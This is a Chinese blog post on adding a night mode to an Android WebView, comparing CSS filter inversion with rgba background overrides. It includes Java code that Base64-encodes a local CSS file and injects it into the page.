<p>一般会在源码中添加一些css元素来改变网页的效果，即改即显，还是比较方便的。</p>
<p></p>
<p>在调试的过程中，还实验了另外一种方式：</p>
<p><a href="http://blog.csdn.net/OldGoldenFox/article/details/52397911" rel="nofollow" data-token="d662b2a37bca633481533017d749edf6">利用invert属性翻转网页颜色 </a></p>
</p>
<pre><code class="language-css">html {
    background-color : #2e2e2e !important;
    zoom             : 1.055;
  }
body {
    text-rendering             : optimizeSpeed;
    image-rendering            : optimizeSpeed;
    -webkit-image-rendering    : optimizeSpeed;

    text-shadow            : 0 0 0 #000;
    -webkit-font-smoothing : antialiased;

    -webkit-filter         : invert(1)hue-rotate(180deg);
    -ms-filter             : invert(1)hue-rotate(180deg);
    filter                 : invert(1)hue-rotate(180deg);
}

input,textarea,select{color:purple}

img, video, iframe, canvas, svg,
embed[type='application/x-shockwave-flash'],
object[type='application/x-shockwave-flash'],
*[style*='url('] {
    -webkit-filter : invert(1)hue-rotate(180deg) !important;
    -ms-filter     : invert(1)hue-rotate(180deg) !important;
    filter         : invert(1)hue-rotate(180deg) !important;
}</code></pre>
<p>也就是利用css的filter滤镜效果来实现，filter滤镜有各种效果可实现，具体可参考： </p>
<p><a href="https://www.jianshu.com/p/c7924f19d5bb" rel="nofollow" data-token="9d57a50edfae2e5d5de1a67adeb3c18c">CSS3 filter滤镜</a></p>
<p>上面的代码主要是利用invert反色和hue-rotate色调来实现，但是实际效果不是很理想。也就是作用于整个页面，把白的地方变成黑的，其他颜色值都进行了一定的反转，像上面那种操作，只是反转了颜色，并不能使用自己想要的颜色，也就是说反转后的颜色值依赖于原网页的颜色值，这并不是想要的结果。</p>
<p><span style="color:#000000;">当时就在想，filter就不能指定我需要的颜色吗？</span></p>
<p><span style="color:#000000;"><span style="color:#000000;">其实在色彩界，有三种表示颜色的方式：</span></span></p>
<p><span style="color:#000000;"><span style="color:#000000;">RGB、HEX、HSL<br /></span></span></p>
<p>我开始使用的是HEX，就是这种形式：#232323，三种颜色之间可以自由转换：</p>
<p><a href="http://tools.jb51.net/color/rgb_hex_hsl" rel="nofollow" data-token="b67ea8c57e0b940a9105cc7bde20496c">转换器</a></p>
<p><span style="color:#000000;"><span style="color:#000000;"><span style="color:#000000;">所以我就想把之前的hex模式的颜色转换成hsl的，正好，filter的滤镜可以来表示这个色值：</span></span></span></p>
<p><font color="#000000"><span style="color:#000000;"><span style="color:#000000;"><span style="color:#000000;">filter的</span></span></span></font><span style="color:rgb(47,47,47);font-size:16px;">hue-rotate就代表了H色相，<span style="color:rgb(102,102,102);font-family:verdana, '宋体', arial, georgia, helvetica, sans-serif;font-size:13px;"><strong>saturate代表了S饱和度，<span style="color:rgb(102,102,102);font-family:verdana, '宋体', arial, georgia, helvetica, sans-serif;font-size:13px;"><strong>brightness代表了L亮度</strong></span></strong></span></span><font color="#000000"><span style="color:#000000;"><span style="color:#000000;"><span style="color:#000000;"><br /> 所以通过转换之后得到了：</span></span></span></font></p>
<p><font color="#000000"><font color="#000000"><span style="color:#000000;"><span style="color:#000000;"><a href="https://www.jianshu.com/p/c7924f19d5bb" rel="nofollow" data-token="9d57a50edfae2e5d5de1a67adeb3c18c"><span style="color:#000000;"><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229181050253" alt=""><br /></span></a></span></span></font></font>然后打算这么使用：</p>
</p>
<pre style="font-family:'DejaVu Sans Mono';font-size:13.5pt;">-webkit-filter : hue-rotate(<span style="color:#0000ff;">149</span>deg)saturate(<span style="color:#0000ff;">10.1</span>%)brightness(<span style="color:#0000ff;">13.5</span>%);</pre>
<p> 实际效果简直惨不忍睹，不经颜色值不对，图片失真，文字失真。 </p>
<p>回想一下，不失真才怪呢，filter是把整个页面做了一次滤镜效果，肯定就是在原来的图像上覆盖一层滤镜，毕竟我只是想简单的改变一下背景，在改变一下文字效果而已。遂放弃这种方式。</p>
<p></p>
<p>最后，终极方式来了：</p>
</p>
<pre><code class="language-css">/*所有元素的背景色都设置为黑夜模式，原来使用#201f26（rgb）会影响celltick资讯详情页里列表项的图片显示，这里改用rgba，有0.8的透明度*/
*, *:before, *:after {
    box-sizing: inherit;
    background-color: rgba(32, 31, 38, 0.8) !important;
}

/*背景颜色和一般字体颜色*/
div,h1,h2,h3,h4,h5,h6,p,body,em,html,link,textarea,form,select,input,span,button,em,menu,aside,table,tr,td,nav,dl,dt,dd,amp-iframe,main{
    /*background-color: rgba(32, 31, 38, 0.8) !important;*/
    color: #888888!important;
    border-color: #555555 !important;
    text-shadow            : 0 0 0 #000; /*去掉文本的阴影效果*/
}

/*超链接*/
a{
    color:#3c5180 !important;
}

strong {
	display: block;
}

img, video, iframe, canvas, svg,amp-social-share,
embed[type='application/x-shockwave-flash'],
object[type='application/x-shockwave-flash'],
*[style*='url('] {
    -webkit-filter : opacity(50%);
    -ms-filter     : opacity(50%);
    filter         : opacity(50%);
}</code></pre>
<p>实现方式还是修改backgroud-color属性，使用rgba模式设置。 </p>
<p>对一些特殊的标签，比如img，视频，动画，广告之类的进行了透明度的改变。整体效果下来非常不错了。<br /> 目前的话，还有一些个别的标签没有适配到，后期再慢慢优化了。</p>
<p><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229183042211" alt=""></p>
<p>网上都说在webview的onPageFinished回调的时候再去执行css的注入，但是在实际使用过程中，某些个网页并不会回调这个方法，并且在加载前会显示原来网页的颜色。所以为了能一开始加载网页 的时候就显示夜间模式，我在几个地方都调用了注入方法：</p>
<p>webviewClient的onPageStarted，onPageFinished,</p>
<p>webviewChromeClient的onProgressChanged</p>
<p>这几个回调的时候都去执行注入方法：</p>
</p>
<pre><code class="language-java">webView.loadUrl("javascript:(function() {" + "var parent = document.getElementsByTagName('head').item(0);" + "var style = document.createElement('style');" + "style.type = 'text/css';" + "style.innerHTML = window.atob('" + code + "');" + "parent.appendChild(style)" + "})();");</code></pre>
<p>其中code是个String类型，是css文件转换后的字符串。<br />
  </p>
<pre><code class="language-java">InputStream is = AppContextUtils.getAppContext().getResources().openRawResource(R.raw.night);
                    byte[] buffer = new byte[0];
                    try {
                        buffer = new byte[is.available()];
                        is.read(buffer);
                    } catch (IOException e) {
                        e.printStackTrace();
                    } finally {
                        try {
                            is.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                    nightCode = Base64.encodeToString(buffer, Base64.NO_WRAP);</code></pre>
<p>R.raw.night是存放在工程raw文件加下的css文件，里面的内容就是终极版本的css代码。 </p>
<p>这里存放到文件中是方便以后修改，然后在应用初始化的时候去加载这个css文件，转换成String类型的nightCode，在需要使用夜间模式的时候，就把这个code注入到webview中了。<br /><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229184351087" alt=""></p>
<p>夜间模式适配，基本上告一段落了。</p>
<p></p>
<p>总结了几点：</p>
<p>1. 需要熟悉js html css，这样才能排坑</p>
<p>2. 使用chrome先调好，再在代码中实验，一般chrome调好的样式在代码中有同样的效果。</p>
</p></div>
</div>
]]></content:encoded>
										</item>
	</channel>
</rss>
